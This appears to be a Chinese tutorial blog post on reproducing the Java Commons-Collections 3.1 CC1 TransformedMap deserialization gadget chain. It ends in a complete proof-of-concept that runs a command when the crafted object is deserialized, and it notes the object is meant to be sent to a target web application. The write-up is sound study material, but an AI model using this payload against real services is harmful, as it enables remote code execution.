---
title: Java反序列化之CC1-TransFormed
date: 2023/5/1 15:00:25
categories:
- Java
tags:
- 反序列化
---

## CC1-TransFormed chains

### 环境

java<8u71

```xml
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>
```



### 复现

**Demo**

![image-20230923145638448](../images/image-20230923145638448.png)

关键点

```bash
# 能够任意命令执行的点
InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类使用了反射，并且反射的参数可控，可以⽤来执⾏任意⽅法。
```

![image-20230923155216854](../images/image-20230923155216854.png)

```bash
# 手动调用InvokerTransformer的transfrom方法来执行命令
Runtime runtime = Runtime.getRuntime();
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);
```

Demo代码解释

- 构造回调链

  ![image-20230923195149097](../images/image-20230923195149097.png)

  ```java
  Transformer[] transformers = new Transformer[]{
                  //直接返回当前环境的Runtime对象
                  new ConstantTransformer(Runtime.getRuntime()),
  
                  //第⼀个参数是待执⾏的⽅法名（哪个类的方法名？前一个回调函数返回的结果即ConstantTransformer返回的对象）
                  //第⼆个参数是这个函数的参数列表的参数类型
                  //第三个参数是传给这个函数的参数列表
                  new InvokerTransformer(
                          "exec",
                          new Class[]{String.class},
                          new Object[]{"calc"}
                          ),
          };
  //将内部的多个Transformer串在⼀起，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊
  Transformer transformerChain = new ChainedTransformer(transformers);
  ```

- 修饰Map

  > TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map**在添加新的元素时，将可以执⾏⼀个回调**。

  ```java
  //修饰Map
  Map innerMap = new HashMap();
  Map outerMap = TransformedMap.decorate(
      innerMap,
      null,
      transformerChain
  );
  ```

- 触发回调最后执行Runtime对象的exec方法

  ```java
  //触发回调
  outerMap.put("test", "xxxx");     
  ```

**POC**

通过上面的Demo我们可知链子的尾巴在`InvokerTransformer`的`transfrom`方法,往回找

![image-20220114111551082](../images/db55d9439c95d5cda0646b0be1180bfa.png)

![image-20230923165556436](../images/image-20230923165556436.png)

查看 TranformedMap 的构造方法，因为是 protected 属性无法调用，寻找到一个静态方法调用了构造方法

![image-20220114130017028](../images/98896b69dec504c41a332c33936d02ef.png)

```java
Runtime runtime = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});

HashMap<Object,Object> map = new HashMap<>();
//使用静态方法decorate来调用构造函数
TransformedMap.decorate(map, null, invokerTransformer);
```

找谁调用了`checkSetValue`

![image-20230923170844418](../images/image-20230923170844418.png)

`MapEntry`的`setValue`是用于遍历HashMap的。所以只需要遍历一个Map就可以触发这个`setValue`方法。

```java
Runtime runtime = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});


HashMap<Object,Object> map = new HashMap<>();
map.put("test","123");
Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);
for (Map.Entry entry: transformedMap.entrySet()) {
	// 调用 SetValue，SetValue 中调用了 checkSetValue，checkSetValue 调用了 transform
	entry.setValue(runtime);
}
```

继续找谁调用了`setValue`，这里刚好有一个在`readObject`里调用了`setValue`的

![image-20230923173037421](../images/image-20230923173037421.png)

![image-20230923173551302](../images/image-20230923173551302.png)

![image-20230923173506439](../images/image-20230923173506439.png)

并且从该类的构造函数可以知道`memberValues`是可控的

```java
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap<Object,Object> map = new HashMap<>();
        map.put("test","123");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);
//        for (Map.Entry entry: transformedMap.entrySet()) {
//            // 调用 SetValue，SetValue 中调用了 checkSetValue，checkSetValue 调用了 transform
//            entry.setValue(runtime);
//        }
        
        //类没有注明类型，默认为 default，即只能在本包内使用，所以需要用反射调用执行
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationdhlConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationdhlConstructor.setAccessible(true);
        Object o = annotationInvocationdhlConstructor.newInstance(Override.class, transformedMap);
```

现在有两个问题

1. Runtime 类不可以被序列化，没有继承 serializable 接口，反射获取并转换为Transformer写法

   ```java
   //首先需要获得Runtime类的Class实例
   Class clz = Class.forName("java.lang.Runtime");
   //获得Runtime类的getRuntime方法
   Method getruntime = clz.getMethod("getRuntime");
   
   //调用该方法获得Runtime对象
   Object runtime = getruntime.invoke(clz);
   //获得Runtime类的exec方法
   Method exec = clz.getMethod("exec",String.class);
   //调用exec方法执行命令
   exec.invoke(runtime,"calc");
   
   
   Transformer[] transformers = new Transformer[]{
                   new ConstantTransformer(Runtime.class),
                   new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                   new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                   new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
   
           };
           Transformer transformerChain = new ChainedTransformer(transformers);
   ```

2. if条件

   > 这部分是注解的知识

   ![image-20230923190120874](../images/image-20230923190120874.png)

   > 1. sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法,方法名为value
   >
   >    ```java
   >    Object o = annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap);
   >    ```
   >
   > 2. 被 TransformedMap.decorate 修饰的Map中必须有一个键名为value的元素
   >
   >    ```java
   >    map.put("value","xxx");
   >    ```
   >
   >    ![image-20230923190034704](../images/image-20230923190034704.png)

3. 类不可控

   ![image-20230923190148131](../images/image-20230923190148131.png)

   需要控制setvalue的参数为Runtime对象

   ```java
   new ConstantTransformer(Runtime.class) //输入啥对象返回啥对象
   ```

**最终payload**

```java
public class CommonCollections1POC {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),

        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","123");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, transformerChain);
        
//        手动触发setvalue
//        for (Map.Entry entry: transformedMap.entrySet()) {
//            // 调用 SetValue，SetValue 中调用了 checkSetValue，checkSetValue 调用了 transform
//            entry.setValue(runtime);
//        }

        //类没有注明类型，默认为 default，即只能在本包内使用，所以需要用反射调用执行
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationdhlConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationdhlConstructor.setAccessible(true);
        // Target 注解类型
        Object o = annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap);

        serialize(o);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;

    }
}
```

![image-20230923191819061](../images/image-20230923191819061.png)

### 总结

```java
我们构造恶意的AnnotationInvocationHandler类，将该类的成员变量memberValues赋值为我们精心构造的TransformedMap对象，并将AnnotationInvocationHandler类进行序列化，然后交给目标JAVA WEB应用进行反序列化。在进行反序列化时，会执行readObject()方法，该方法会对成员变量TransformedMap的Value值进行修改，该修改触发了TransformedMap实例化时传入的参数InvokerTransformer的transform()方法，InvokerTransformer.transform()方法通过反射链调用Runtime.getRuntime.exec(“xx”)函数来执行系统命令。
```

**不要找同名函数调用陷入循环**

**如果类没有注明类型，默认为 default，即只能在本包内使用，需要用反射调用执行**